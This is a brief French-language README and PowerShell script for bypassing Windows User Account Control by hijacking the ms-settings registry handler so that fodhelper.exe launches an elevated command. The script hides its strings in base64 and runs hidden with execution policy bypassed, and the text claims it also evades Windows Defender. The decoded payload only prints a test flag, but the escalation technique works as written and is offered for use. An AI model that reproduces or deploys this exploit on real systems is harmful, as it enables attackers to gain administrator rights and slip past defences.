# bypass_UAC_fodhelper
Ce script profite du programme fodhelper.exe avec un IL High automatique pour contourner l'UAC. Il bypass normalement Windefender


$charge = "UABvAHcAZQByAHMAaABlAGwAbAAgAC0ATgBvAEUAeABpAHQAIAAtAGMAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACcARgBMAEEARwBfAFQARQBTAFQAJwA="
$target = "QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGYAbwBkAGgAZQBsAHAAZQByAC4AZQB4AGUA"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
$charge_final = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($charge))
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $charge_final -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc $target"
